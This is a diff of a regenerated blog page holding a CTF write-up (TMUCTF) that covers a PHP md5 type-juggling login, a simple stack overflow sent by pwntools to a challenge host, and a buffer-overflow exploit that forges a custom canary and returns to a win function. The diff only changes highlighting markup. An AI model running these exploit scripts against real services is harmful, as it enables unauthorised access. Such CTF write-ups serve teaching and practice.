@@ -271,19 +271,19 @@
 <h2 id="web">Web</h2>
 <h3 id="login">Login</h3>
 <p>Straight away we hit up <code>/robots.txt</code> as is my approach for every ctf web challenge. This yields some PHP sauce:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;password&#34;</span>])) {
-    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#34;md5&#34;</span>, $_GET[<span style="color:#e6db74">&#34;password&#34;</span>]) <span style="color:#f92672">==</span> $_GET[<span style="color:#e6db74">&#34;password&#34;</span>]) {
-        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h1&gt;Here is the flag:&lt;/h1&gt;&#34;</span> <span style="color:#f92672">.</span> $flag;
-    } <span style="color:#66d9ef">else</span> {
-        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Try harder!&#34;</span>;
-    }
-}
-</code></pre></div><p>Which I look at and have two guesses:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;password&#34;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#34;md5&#34;</span>, $_GET[<span style="color:#e6db74">&#34;password&#34;</span>]) <span style="color:#f92672">==</span> $_GET[<span style="color:#e6db74">&#34;password&#34;</span>]) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h1&gt;Here is the flag:&lt;/h1&gt;&#34;</span> <span style="color:#f92672">.</span> $flag;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Try harder!&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which I look at and have two guesses:</p>
 <ul>
 <li>md5 collisions</li>
 <li>type juggling</li>
 </ul>
-<p>Now its important to note that &lsquo;type juggling&rsquo; is a term I have <em>heard</em> of in relation to PHP vulnerabilities. But which I knew nothing about really.</p>
+<p>Now its important to note that &rsquo;type juggling&rsquo; is a term I have <em>heard</em> of in relation to PHP vulnerabilities. But which I knew nothing about really.</p>
 <p>Now we focus on the only important line here:</p>
 <p><code>if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) == $_GET[&quot;password&quot;])</code></p>
 <p>The first guess is based on the idea that <code>md5</code> is a known vulnerable hashing algorithm which fails on several properties of a cryptographic hash:</p>
@@ -324,14 +324,14 @@
 <p><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></p>
 <p>Will overwrite a value on the stack which is compared to <code>0</code> in a if condition somewhere causing the check to pass and the flag to be printed.</p>
 <p>It&rsquo;s easiest just to do this overflow with netcat but here&rsquo;s a script anyway.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
-HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;194.5.207.56&#39;</span>
-PORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;7000&#39;</span>
-proc <span style="color:#f92672">=</span> remote(HOST, PORT)
-proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Let us know your name: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">242</span>)
-log<span style="color:#f92672">.</span>success(proc<span style="color:#f92672">.</span>recvall())
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;194.5.207.56&#39;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;7000&#39;</span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Let us know your name: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">242</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(proc<span style="color:#f92672">.</span>recvall())
+</span></span></code></pre></div><blockquote>
 <p>TMUCTF{n0w_y0u_4r3_w4rm3d_up}</p>
 </blockquote>
 <h3 id="baby-pwn">Baby Pwn</h3>
@@ -372,32 +372,32 @@ PIE:      No PIE (0x400000)
 
 
 <p>If we attempt a trivial overflow we will fail the compare in the main function disassembly:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">dword</span> [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>], <span style="color:#ae81ff">0xcafe</span>
-</code></pre></div><p>and fail to reach the vulnerable code in <code>helloUser</code> that will let us control the return pointer. We beat this custom canary by calculating the offset to it and then inserting the expected value as follows:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to cmp @: </span><span style="color:#e6db74">{</span>cyclic_find(<span style="color:#e6db74">&#39;iaa&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-<span style="color:#75715e"># pass inital cmp</span>
-canary <span style="color:#f92672">=</span> flat({
-    <span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>: p64(<span style="color:#ae81ff">0xcafe</span>)
-})
-</code></pre></div><p>This takes us to the vulnerable function and the next stage of our exploit: controlling the return pointer and returning to <strong>wow</strong>, our win function. This is just a simple overflow which we can simplify with pwntools <code>flat</code> and <code>symbols</code> functions once again to complete the exploit chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">dword</span> [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>], <span style="color:#ae81ff">0xcafe</span>
+</span></span></code></pre></div><p>and fail to reach the vulnerable code in <code>helloUser</code> that will let us control the return pointer. We beat this custom canary by calculating the offset to it and then inserting the expected value as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to cmp @: </span><span style="color:#e6db74">{</span>cyclic_find(<span style="color:#e6db74">&#39;iaa&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pass inital cmp</span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>: p64(<span style="color:#ae81ff">0xcafe</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>This takes us to the vulnerable function and the next stage of our exploit: controlling the return pointer and returning to <strong>wow</strong>, our win function. This is just a simple overflow which we can simplify with pwntools <code>flat</code> and <code>symbols</code> functions once again to complete the exploit chain.</p>
 <p><strong>Exploit</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to cmp @: </span><span style="color:#e6db74">{</span>cyclic_find(<span style="color:#e6db74">&#39;iaa&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-<span style="color:#75715e"># pass inital cmp</span>
-canary <span style="color:#f92672">=</span> flat({
-    <span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>: p64(<span style="color:#ae81ff">0xcafe</span>)
-})
-proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;enter your name:&#39;</span>, canary)
-
-<span style="color:#75715e">## win @wow    </span>
-payload <span style="color:#f92672">=</span> flat({
-    <span style="color:#ae81ff">136</span>: elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;wow&#39;</span>]
-})
-
-proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;yourself ;;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
-
-<span style="color:#75715e"># shellit</span>
-proc<span style="color:#f92672">.</span>interactive()
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to cmp @: </span><span style="color:#e6db74">{</span>cyclic_find(<span style="color:#e6db74">&#39;iaa&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pass inital cmp</span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>: p64(<span style="color:#ae81ff">0xcafe</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;enter your name:&#39;</span>, canary)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## win @wow    </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">136</span>: elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;wow&#39;</span>]
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;yourself ;;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
 <p>TMUCTF{w0w!_y0u_c0uld_f1nd_7h3_w0w!}</p>
 </blockquote>
 
@@ -493,7 +493,7 @@ proc<span style="color:#f92672">.</span>interactive()
 
 
 
-<script type="text/javascript" src="/bundle.min.549d9d8402283235466245c699b04a81b6fb2c75fc03669ba95af9f5e8ad22ab134f177abab9e431efc3441fe5921fd3fb3f8bf50f66dffbdce9eb7994ef69dc.js" integrity="sha512-VJ2dhAIoMjVGYkXGmbBKgbb7LHX8A2abqVr59eitIqsTTxd6urnkMe/DRB/lkh/T&#43;z&#43;L9Q9m3/vc6et5lO9p3A=="></script>
+<script type="text/javascript" src="/bundle.min.755e4cf350f154c0fee20aa6a1b7fa2b35fcbeaaf4cc62ef45531b19ae1fd43e5ed19c3c3bbf522045953eaef03e1cb96a64a636782486a3aa0b0563d0ef5406.js" integrity="sha512-dV5M81DxVMD&#43;4gqmobf6KzX8vqr0zGLvRVMbGa4f1D5e0Zw8O79SIEWVPq7wPhy5amSmNngkhqOqCwVj0O9UBg=="></script>
 
 
 
